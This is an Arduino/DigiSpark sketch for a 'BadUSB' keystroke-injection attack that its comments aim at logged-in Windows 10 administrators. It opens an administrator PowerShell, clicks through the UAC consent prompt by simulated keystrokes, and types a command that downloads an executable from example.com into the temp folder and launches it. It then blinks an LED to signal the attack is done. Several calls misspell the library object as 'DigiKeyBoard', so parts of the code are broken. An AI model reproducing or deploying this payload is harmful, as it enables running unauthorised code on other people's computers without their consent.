#include "DigiKeyboard.h"

/*
 Need to do this to blink LED Later
*/
void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
   // Emulate keystrokes 
   // In this case, we are targeting a Windows 10 user who is logged into an administrator account.
   
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // [Left Windows Key] + [X]; 
   DigiKeyboard.sendKeyStroke(KEY_A); // Pressing A when this menu is pulled up will open an admin powershell
   
   /* 
   * This will cause the annoying administrator permission dialog to show up, prompting the user if they'd like to continue. 
   we can bypass this quickly, but not as fast as i'd like unfortunately 
   */

   DigiKeyboard.delay(300);
   DigiKeyBoard.sendKeyStroke(KEY_ARROW_LEFT); // [<-];
   DigiKeyboard.delay(300);
   DigiKeyBoard.sendKeyStroke(KEY_ENTER); // [Enter];    
   
   /* 
   This powershell command will download a file from a website, save it to the temp directory, and launch it as a new process. 
   */
   DigiKeyBoard.println("powershell -c 'wget \"http://example.com/badusb.exe\" -outfile \"$env:temp/badusb.exe\"; Start-Process \"$env:temp/badusb.exe\"'");
   

   DigiKeyBoard.println("exit");
   blinkLED();
}

/**
* Smoothly blink the LED to indicate that the attack is complete. Because it looks cool. 
*/
void blinkLED(){
  byte brightness = 0;
  byte inc = 15; 
  while(1){
    analogWrite(1, brightness);
    brightness += inc;
    if(brightness <= 0 || brightness >= 75)
      inc = -inc;
    delay(50);
  }
}

